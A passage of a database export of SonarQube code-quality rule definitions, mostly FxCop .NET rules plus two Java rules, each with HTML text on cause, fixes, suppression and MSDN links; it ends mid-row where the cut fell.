269	CA1601: Do not use timers that prevent power state changes	DoNotUseTimersThatPreventPowerStateChanges	CA1601	fxcop	<h2>Cause</h2>\n<p>\n            A timer has an interval set to occur more than one time per second.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Do not poll more often than one time per second or use timers that occur more frequently than one time per second. Higher-frequency periodic activity will keep the CPU busy and interfere with power-saving idle timers that turn off the display and hard disks.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Set timer intervals to occur less than one time per second.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            This rule should be suppressed only if firing the timer more than one time per second is required and mobility considerations can safely be ignored.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182230.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182230.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806681	1511453806681	1
270	CA2223: Members should differ by more than return type	MembersShouldDifferByMoreThanReturnType	CA2223	fxcop	<h2>Cause</h2>\n<p>\n            Two public or protected members have signatures that are identical except for return type.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Although the common language runtime permits the use of return types to differentiate between otherwise identical members, this feature is not in the Common Language Specification, nor is it a common feature of .NET programming languages. When members differ only by return type, developers and development tools might not correctly distinguish between them.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the design of the members so that they are unique based only on their names and parameter types, or do not expose the members.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182352.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182352.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806682	1511453806682	1
271	Template for custom FxCop rules	CustomRuleTemplate	\N	fxcop	<p>\nFollow these steps to make your custom FxCop rules available in SonarQube:\n</p>\n\n<ol>\n  <li>Place your custom FxCop rules assemblies in the "Rules" subdirectory of your FxCop installation directory.</li>\n  <li>For each custom rule:</li>\n  <ol>\n    <li>Create a new rule in SonarQube by "copying" this rule template and specify the <code>CheckId</code> of your custom rule, a title, a description, and a default severity.</li>\n    <li>Enable the newly created rule in your quality profile</li>\n  </ol>\n  <li>Relaunch an analysis on your projects, et voilà, your custom rules are executed!</li>\n</ol>	2	\N	READY	cs	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	t	HTML	1511453806683	1511453806683	1
388	CA1050: Declare types in namespaces	DeclareTypesInNamespaces	CA1050	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type is defined outside the scope of a named namespace.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types are declared in namespaces to prevent name collisions, and as a way to organize related types in an object hierarchy. Types that are outside any named namespace are in a global namespace that cannot be referenced in code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, place the type in a namespace.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Although you never have to suppress a warning from this rule, it is safe to do this when the assembly will never be used together with other assemblies.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182134.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182134.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806842	1511453806842	1
272	CA2242: Test for NaN correctly	TestForNaNCorrectly	CA2242	fxcop	<h2>Cause</h2>\n<p>\n            An expression tests a value against <code>Single.Nan</code> or <code>Double.Nan</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>Double.NaN</code>\n              , which represents not-a-number, results when an arithmetic operation is undefined. Any expression that tests equality between a value and <code>Double.NaN</code> always returns <code>false</code>. Any expression that tests inequality between a value and <code>Double.NaN</code> always returns <code>true</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule and accurately determine whether a value represents <code>Double.NaN</code>, use <code>Single.IsNan</code> or <code>Double.IsNan</code> to test the value.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264491.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264491.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806686	1511453806688	1
273	CA1040: Avoid empty interfaces	AvoidEmptyInterfaces	CA1040	fxcop	<h2>Cause</h2>\n<p>\n            The interface does not declare any members or implement two or more other interfaces.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Interfaces define members that provide a behavior or usage contract. The functionality that is described by the interface can be adopted by any type, regardless of where the type appears in the inheritance hierarchy. A type implements an interface by providing implementations for the members of the interface. An empty interface does not define any members. Therefore, it does not define a contract that can be implemented.\n            If your design includes empty interfaces that types are expected to implement, you are probably using an interface as a marker or a way to identify a group of types. If this identification will occur at run time, the correct way to accomplish this is to use a custom attribute. Use the presence or absence of the attribute, or the properties of the attribute, to identify the target types. If the identification must occur at compile time, then it is acceptable to use an empty interface.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove the interface or add members to it. If the empty interface is being used to label a set of types, replace the interface with a custom attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the interface is used to identify a set of types at compile time.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182128.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182128.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806689	1511453806689	1
274	CA1045: Do not pass types by reference	DoNotPassTypesByReference	CA1045	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method in a public type has a <code>ref</code> parameter that takes a primitive type, a reference type, or a value type that is not one of the built-in types.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Passing types by reference (using <code>out</code> or <code>ref</code>) requires experience with pointers, understanding how value types and reference types differ, and handling methods that have multiple return values. Also, the difference between <code>out</code> and <code>ref</code> parameters is not widely understood.\n            When a reference type is passed "by reference," the method intends to use the parameter to return a different instance of the object. (Passing a reference type by reference is also known as using a double pointer, pointer to a pointer, or double indirection.) Using the default calling convention, which is pass "by value," a parameter that takes a reference type already receives a pointer to the object. The pointer, not the object to which it points, is passed by value. Passing by value means that the method cannot change the pointer to have it point to a new instance of the reference type, but can change the contents of the object to which it points. For most applications this is sufficient and yields the behavior that you want.\n            If a method must return a different instance, use the return value of the method to accomplish this. See the <code>System.String</code> class for a variety of methods that operate on strings and return a new instance of a string. By using this model, it is left to the caller to decide whether the original object is preserved.\n            Although return values are commonplace and heavily used, the correct application of <code>out</code> and <code>ref</code> parameters requires intermediate design and coding skills. Library architects who design for a general audience should not expect users to master working with <code>out</code> or <code>ref</code> parameters.\n\n\n\n\n\n                    Note\n\n\n\n\n                    When you work with parameters that are large structures, the additional resources that are required to copy these structures could cause a performance effect when you pass by value. In these cases, you might consider using <code>ref</code> or <code>out</code> parameters.\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule that is caused by a value type, have the method return the object as its return value. If the method must return multiple values, redesign it to return a single instance of an object that holds the values.\n            To fix a violation of this rule that is caused by a reference type, make sure that the behavior that you want is to return a new instance of the reference. If it is, the method should use its return value to do this.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule; however, this design could cause usability issues.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidOutParameters}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182146.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182146.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806690	1511453806691	1
275	CA1702: Compound words should be cased correctly	CompoundWordsShouldBeCasedCorrectly	CA1702	fxcop	<h2>Cause</h2>\n<p>\n            The name of an identifier contains multiple words and at least one of the words appears to be a compound word that is not cased correctly.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The name of the identifier is split into words that are based on the casing. Each contiguous two-word combination is checked by the Microsoft spelling checker library. If it is recognized, the identifier produces a violation of the rule. Examples of compound words that cause a violation are "CheckSum" and "MultiPart", which should be cased as "Checksum" and "Multipart", respectively. Due to previous common usage, several exceptions are built into the rule, and several single words are flagged, such as "Toolbar" and "Filename", that should be cased as two distinct words (in this case, "ToolBar" and "FileName").\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Change the name so that it is cased correctly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if both parts of the compound word are recognized by the spelling dictionary and the intent is to use two words.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA1701: Resource string compound words should be cased correctly\n\n\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264474.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264474.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806692	1511453806693	1
276	CA1810: Initialize reference type static fields inline	InitializeReferenceTypeStaticFieldsInline	CA1810	fxcop	<h2>Cause</h2>\n<p>\n            A reference type declares an explicit static constructor.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a type declares an explicit static constructor, the just-in-time (JIT) compiler adds a check to each static method and instance constructor of the type to make sure that the static constructor was previously called. Static initialization is triggered when any static member is accessed or when an instance of the type is created. However, static initialization is not triggered if you declare a variable of the type but do not use it, which can be important if the initialization changes global state.\n            When all static data is initialized inline and an explicit static constructor is not declared, Microsoft intermediate language (MSIL) compilers add the <code>beforefieldinit</code> flag and an implicit static constructor, which initializes the static data, to the MSIL type definition. When the JIT compiler encounters the <code>beforefieldinit</code> flag, most of the time the static constructor checks are not added. Static initialization is guaranteed to occur at some time before any static fields are accessed but not before a static method or instance constructor is invoked. Note that static initialization can occur at any time after a variable of the type is declared.\n            Static constructor checks can decrease performance. Often a static constructor is used only to initialize static fields, in which case you must only make sure that static initialization occurs before the first access of a static field. The <code>beforefieldinit</code> behavior is appropriate for these and most other types. It is only inappropriate when static initialization affects global state and one of the following is true:\n            <ul>\n              <li>\n                The effect on global state is expensive and is not required if the type is not used.\n              </li>\n              <li>\n                The global state effects can be accessed without accessing any static fields of the type.\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, initialize all static data when it is declared and remove the static constructor.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if performance is not a concern; or if global state changes that are caused by static initialization are expensive or must be guaranteed to occur before a static method of the type is called or an instance of the type is created.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:InitializeValueTypeStaticFieldsInline}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182275.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182275.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806693	1511453806694	1
277	CA2136: Members should not have conflicting transparency annotations	TransparencyAnnotationsShouldNotConflict	CA2136	fxcop	<h2>Cause</h2>\n<p>\n            This rule fires when a type member is marked with a <code>System.Security</code> security attribute that has a different transparency than the security attribute of a container of the member.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Transparency attributes are applied from code elements of larger scope to elements of smaller scope. The transparency attributes of code elements with larger scope take precedence over transparency attributes of code elements that are contained in the first element. For example, a class that is marked with the <code>SecurityCriticalAttribute</code> attribute cannot contain a method that is marked with the <code>SecuritySafeCriticalAttribute</code> attribute.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix this violation, remove the security attribute from the code element that has lower scope, or change its attribute to be the same as the containing code element.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress warnings from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264493.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264493.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806695	1511453806696	1
278	CA1400: P/Invoke entry points should exist	PInvokeEntryPointsShouldExist	CA1400	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method is marked with the <code>System.Runtime.InteropServices.DllImportAttribute</code>. Either the unmanaged library could not be located or the method could not be matched to a function in the library. If the rule cannot find the method name exactly as it is specified, it looks for ANSI or wide-character versions of the method by suffixing the method name with 'A' or 'W'. If no match is found, the rule attempts to locate a function by using the __stdcall name format (_MyMethod@12, where 12 represents the length of the arguments). If no match is found, and the method name starts with '#', the rule searches for the function as an ordinal reference instead of a name reference.\n</p>\n<h2>Rule Description</h2>\n<p>\n            No compile-time check is available to make sure that methods that are marked with <code>DllImportAttribute</code> are located in the referenced unmanaged DLL. If no function that has the specified name is  in the library, or the arguments to the method do not match the function arguments, the common language runtime throws an exception.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, correct the method that has the <code>DllImportAttribute</code> attribute. Make sure that the unmanaged library exists and is in the same directory as the assembly that contains the method. If the library is present and correctly referenced, verify that the method name, return type, and argument signature match the library function.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule when the unmanaged library is in the same directory as the managed assembly that references it. It might be safe to suppress a warning from this rule in the case where the unmanaged library could not be located.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182208.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182208.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806696	1511453806697	1
471	"catch" clauses should do more than rethrow	S2737	S2737	squid	<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting it bubble up automatically, but with more code and the additional detrement of leaving maintainers scratching their heads. </p>\n<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstring s = "";\ntry {\n  s = File.ReadAllText(fileName);\n}\ncatch (Exception e) {  // Noncompliant\n  throw e;\n}\n</pre>\n\n<h2>Compliant Code Example</h2>\n<pre>\nstring s = "";\ntry {\n  s = File.ReadAllText(fileName);\n}\ncatch (Exception e) {  // Compliant\n  logger.LogError(e);\n  throw e;\n}\n</pre>\n<p>or</p>\n<pre>\nstring s = File.ReadAllText(fileName);\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,unused	f	HTML	1511453806987	1511453806988	1
472	The non-serializable super class of a "Serializable" class should have a no-argument constructor	S2055	S2055	squid	<p>When a <code>Serializable</code> object has a non-serializable ancestor in its inheritance chain, object deserialization (re-instantiating the object from file) starts at the first non-serializable class, and proceeds down the chain, adding the properties of each subsequent child class, until the final object has been instantiated.</p>\n\n<p>In order to create the non-serializable ancestor, its no-argument constructor is called. Therefore the non-serializable ancestor of a <code>Serializable</code> class must have a no-arg constructor. Otherwise the class is <code>Serializable</code> but not deserializable.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  private Season ripe;\n\n  public Fruit (Season ripe) {...}\n  public void setRipe(Season ripe) {...}\n  public Season getRipe() {...}\n}\n\npublic class Raspberry extends Fruit \n        implements Serializable {  // Noncompliant; nonserializable ancestor doesn't have no-arg constructor\n  private static final long serialVersionUID = 1;\n\n  private String variety;\n\n  public Raspberry(Season ripe, String variety) { ...}\n  public void setVariety(String variety) {...}\n  public String getVarity() {...}\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  private Season ripe;\n\n  public Fruit () {...};  // Compliant; no-arg constructor added to ancestor\n  public Fruit (Season ripe) {...}\n  public void setRipe(Season ripe) {...}\n  public Season getRipe() {...}\n}\n\npublic class Raspberry extends Fruit \n        implements Serializable {\n  private static final long serialVersionUID = 1;\n\n  private String variety;\n\n  public Raspberry(Season ripe, String variety) {...}\n  public void setVariety(String variety) {...}\n  public String getVarity() {...}\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	serialization	f	HTML	1511453806988	1511453806988	2
279	CA1800: Do not cast unnecessarily	DoNotCastUnnecessarily	CA1800	fxcop	<h2>Cause</h2>\n<p>\n            A method performs duplicate casts on one of its arguments or local variables. For complete analysis by this rule, the tested assembly must be built by using debugging information and the associated program database (.pdb) file must be available.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Duplicate casts decrease performance, especially when the casts are performed in compact iteration statements. For explicit duplicate cast operations, store the result of the cast in a local variable and use the local variable instead of the duplicate cast operations.\n            If the C# <code>is</code> operator is used to test whether the cast will succeed before the actual cast is performed, consider testing the result of the <code>as</code> operator instead. This provides the same functionality without the implicit cast operation that is performed by the <code>is</code> operator.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, modify the method implementation to minimize the number of cast operations.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule, or to ignore the rule completely, if performance is not a concern.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182271.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182271.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806698	1511453806698	1
280	CA2131: Security critical types may not participate in type equivalence	CriticalTypesMustNotParticipateInTypeEquivalence	CA2131	fxcop	<h2>Cause</h2>\n<p>\n            A type participates in type equivalence and a either the type itself, or a member or field of the type, is marked with the <code>SecurityCriticalAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires on any critical types or types that contain critical methods or fields that are participating in type equivalence. When the CLR detects such a type, it fails to load it with a <code>TypeLoadException</code> at run time. Typically, this rule fires only when users implement type equivalence manually rather than by relying on tlbimp and the compilers to do the type equivalence.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the SecurityCritical attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997564.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997564.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806700	1511453806702	1
281	CA2238: Implement serialization methods correctly	ImplementSerializationMethodsCorrectly	CA2238	fxcop	<h2>Cause</h2>\n<p>\n            A method that handles a serialization event does not have the correct signature, return type, or visibility.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A method is designated a serialization event handler by applying one of the following serialization event attributes:\n            <ul>\n              <li>\n\n\n                    <code>System.Runtime.Serialization.OnSerializingAttribute</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Runtime.Serialization.OnSerializedAttribute</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Runtime.Serialization.OnDeserializingAttribute</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Runtime.Serialization.OnDeserializedAttribute</code>\n\n\n              </li>\n            </ul>\n            Serialization event handlers take a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>, return <code>void</code>, and have <code>private</code> visibility.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, correct the signature, return type, or visibility of the serialization event handler.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>\n\n\n\n\n                {rule:fxcop:ImplementISerializableCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:MarkAllNonSerializableFields}<br/>\n\n\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>\n\n\n\n\n                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>\n\n\n\n\n                {rule:fxcop:SecureSerializationConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182344.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182344.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806702	1511453806703	1
282	CA1300: Specify MessageBoxOptions	SpecifyMessageBoxOptions	CA1300	fxcop	<h2>Cause</h2>\n<p>\n            A method calls an overload of the <code>MessageBox.Show</code> method that does not take a <code>System.Windows.Forms.MessageBoxOptions</code> argument.\n</p>\n<h2>Rule Description</h2>\n<p>\n            To display a message box correctly for cultures that use a right-to-left reading order, the <code>RightAlign</code> and <code>RtlReading</code> members of the <code>MessageBoxOptions</code> enumeration must be passed to the <code>Show</code> method. Examine the <code>Control.RightToLeft</code> property of the containing control to determine whether to use a right-to-left reading order.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call an overload of the <code>Show</code> method that takes a <code>MessageBoxOptions</code> argument.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the code library will not be localized for a culture that uses a right-to-left reading order.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182191.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182191.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806703	1511453806704	1
283	CA1812: Avoid uninstantiated internal classes	AvoidUninstantiatedInternalClasses	CA1812	fxcop	<h2>Cause</h2>\n<p>\n            An instance of an assembly-level type is not created by code in the assembly.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule tries to locate a call to one of the constructors of the type, and reports a violation if no call is found.\n            The following types are not examined by this rule:\n            <ul>\n              <li>\n                Value types\n              </li>\n              <li>\n                Abstract types\n              </li>\n              <li>\n                Enumerations\n              </li>\n              <li>\n                Delegates\n              </li>\n              <li>\n                Compiler-emitted array types\n              </li>\n              <li>\n                Types that cannot be instantiated and that define <code>static</code> (<code>Shared</code> in Visual Basic) methods only.\n              </li>\n            </ul>\n            If you apply <code>System.Runtime.CompilerServices.InternalsVisibleToAttribute</code> to the assembly that is being analyzed, this rule will not occur on any constructors that are marked as <code>internal</code> because you cannot tell whether a field is being used by another <code>friend</code> assembly.\n            Even though you cannot work around this limitation in Visual Studio Code Analysis, the external stand-alone FxCop will occur on internal constructors if every <code>friend</code> assembly is present in the analysis.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the type or add the code that uses it. If the type contains only static methods, add one of the following to the type to prevent the compiler from emitting a default public instance constructor:\n            <ul>\n              <li>\n                A private constructor for types that target .NET Framework versions 1.0 and 1.1.\n              </li>\n              <li>\n                The <code>static</code> (<code>Shared</code> in Visual Basic) modifier for types that target .NET Framework 2.0.\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule. We recommend that you suppress this warning in the following situations:\n            <ul>\n              <li>\n                The class is created through late-bound reflection methods such as CreateInstance.\n              </li>\n              <li>\n                The class is created automatically by the runtime or ASP.NET. For example, classes that implement <code>System.Configuration.IConfigurationSectionHandler</code> or <code>System.Web.IHttpHandler</code>.\n              </li>\n              <li>\n                The class is passed as a generic type parameter that has a new constraint. For example, the following example will raise this rule.\n\n\n\n\n\n\n\n\n\n            <pre>\ninternal class MyClass\n{\n    public DoSomething()\n    {\n    }\n}\npublic class MyGeneric&lt;T&gt; where T : new()\n{\n    public T Create()\n    {\n        return new T();\n    }\n}\n// [...]\nMyGeneric&lt;MyClass&gt; mc = new MyGeneric&lt;MyClass&gt;();\nmc.Create();\n</pre>\n\n\n\n\n</li>\n            </ul>\n            In these situations, we recommended you suppress this warning.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidUncalledPrivateCode}<br/>\n\n\n\n\n                {rule:fxcop:ReviewUnusedParameters}<br/>\n\n\n\n\n                {rule:fxcop:RemoveUnusedLocals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182265.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182265.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806705	1511453806706	1
286	CA1301: Avoid duplicate accelerators	AvoidDuplicateAccelerators	CA1301	fxcop	<h2>Cause</h2>\n<p>\n            A type extends <code>System.Windows.Forms.Control</code> and contains two or more top level controls that have identical access keys that are stored in a resource file.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An access key, also known as an accelerator, enables keyboard access to a control by using the ALT key. When multiple controls have duplicate access keys, the behavior of the access key is not well defined. The user might not be able to access the intended control by using the access key and a control other than the one that is intended might be enabled.\n            The current implementation of this rule ignores menu items. However, menu items in the same submenu should not have identical access keys.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, define unique access keys for all controls.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182185.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182185.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806709	1511453806710	1
284	CA1410: COM registration methods should be matched	ComRegistrationMethodsShouldBeMatched	CA1410	fxcop	<h2>Cause</h2>\n<p>\n            A type declares a method that is marked with the <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> attribute but does not declare a method that is marked with the <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code> attribute, or vice versa.\n</p>\n<h2>Rule Description</h2>\n<p>\n            For Component Object Model (COM) clients to create a .NET Framework type, the type must first be registered. If it is available, a method that is marked with the <code>ComRegisterFunctionAttribute</code> attribute is called during the registration process to run user-specified code. A corresponding method that is marked with the <code>ComUnregisterFunctionAttribute</code> attribute is called during the unregistration process to reverse the operations of the registration method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add the corresponding registration or unregistration method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ComRegistrationMethodsShouldNotBeVisible}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182200.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182200.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806707	1511453806707	1
285	CA2210: Assemblies should have valid strong names	AssembliesShouldHaveValidStrongNames	CA2210	fxcop	<h2>Cause</h2>\n<p>\n            An assembly is not signed with a strong name, the strong name could not be verified, or the strong name would not be valid without the current registry settings of the computer.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule retrieves and verifies the strong name of an assembly. A violation occurs if any of the following are true:\n            <ul>\n              <li>\n                The assembly does not have a strong name.\n              </li>\n              <li>\n                The assembly was altered after signing.\n              </li>\n              <li>\n                The assembly is delay-signed.\n              </li>\n              <li>\n                The assembly was incorrectly signed, or signing failed.\n              </li>\n              <li>\n                The assembly requires registry settings to pass verification. For example, the Strong Name tool (Sn.exe) was used to skip verification for the assembly.\n              </li>\n            </ul>\n            The strong name protects clients from unknowingly loading an assembly that has been tampered with. Assemblies without strong names should not be deployed outside very limited scenarios. If you share or distribute assemblies that are not correctly signed, the assembly can be tampered with, the common language runtime might not load the assembly, or the user might have to disable verification on his or her computer. An assembly without a strong name has from the following drawbacks:\n            <ul>\n              <li>\n                Its origins cannot be verified.\n              </li>\n              <li>\n                The common language runtime cannot warn users if the contents of the assembly have been altered.\n              </li>\n              <li>\n                It cannot be loaded into the global assembly cache.\n              </li>\n            </ul>\n            Note that to load and analyze a delay-signed assembly, you must disable verification for the assembly.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n\n              To create a key file\n            Use one of the following procedures:\n            <ul>\n              <li>\n                Use the Assembly Linker tool (Al.exe) provided by the .NET Framework SDK.\n              </li>\n              <li>\n                For the .NET Framework v1.0 or 